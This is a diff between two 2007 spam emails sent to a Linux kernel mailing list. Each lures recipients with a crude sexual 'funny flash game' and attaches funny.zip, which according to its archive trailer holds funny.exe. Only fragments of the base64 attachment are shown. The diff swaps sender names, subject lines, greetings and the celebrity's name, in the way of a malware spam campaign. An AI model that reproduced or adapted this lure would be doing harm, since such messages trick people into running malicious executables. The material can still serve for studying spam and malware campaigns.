@@ -1,10 +1,10 @@
-From: "Stephanie Michel" <macarena.dadisman@ar.inter.net>
-Subject: Beware of fake pills
-Date: Wed, 25 Jul 2007 20:38:39 -0100
-Message-ID: <01c7cefb$c84ea960$e3882fc1@macarena.dadisman>
+From: "Cecilia Murillo" <thorburn.dadisman@bit-studio.at>
+Subject: And I show you how far the rabbit hole goes...
+Date: Wed, 25 Jul 2007 20:38:35 -0100
+Message-ID: <01c7cefb$c6127500$e3882fc1@thorburn.dadisman>
 Mime-Version: 1.0
 Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0006_01C7CF0C.8BD77960"
+	boundary="----=_NextPart_000_0006_01C7CF0C.899B4500"
 Return-path: <linux-pm-bounces@lists.linux-foundation.org>
 List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
@@ -15,23 +15,23 @@ List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
 Sender: linux-pm-bounces@lists.linux-foundation.org
 Errors-To: linux-pm-bounces@lists.linux-foundation.org
-To: linux-pm@lists.osdl.org
+To: linux-pm@osdl.org
 List-Id: linux-pm@vger.kernel.org
 
 This is a multi-part message in MIME format.
 
-------=_NextPart_000_0006_01C7CF0C.8BD77960
+------=_NextPart_000_0006_01C7CF0C.899B4500
 Content-Type: text/plain;
-	charset="iso-8859-1"
+	charset="windows-1250"
 Content-Transfer-Encoding: 7bit
 
-Good evening, friend!
+Good morning, dear!
 
-Do you see this game? Funny flash game with nude Nicole Kidman. She sucks and... fucks! Enjoy! The game in your attachment.
+Do you see this game? Funny flash game with nude Lara Croft. She sucks and... fucks! Enjoy! The game in your attachment.
 
-Regards.
+Good Bye.
 
-------=_NextPart_000_0006_01C7CF0C.8BD77960
+------=_NextPart_000_0006_01C7CF0C.899B4500
 Content-Type: application/zip;
 	name="funny.zip"
 Content-Transfer-Encoding: base64
@@ -377,11 +377,11 @@ UdHnoba4PxjkIBKcveUUYrhXeZlSykTkSkApZaAhymyohgpswHsKbkI6p+yGtVYIDQ+GMQESDLVR
 GRbaiNiTkeNbp/at8+bLSP/faf8XUEsBAhQAFAAAAAgAh2H5NvJT3vm+SgAAAFIAAAkAAAAAAAAA
 AAAgAP+BAAAAAGZ1bm55LmV4ZVBLBQYAAAAAAQABADcAAADlSgAAAAA= 
 
-------=_NextPart_000_0006_01C7CF0C.8BD77960
+------=_NextPart_000_0006_01C7CF0C.899B4500
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
-------=_NextPart_000_0006_01C7CF0C.8BD77960--
+------=_NextPart_000_0006_01C7CF0C.899B4500--
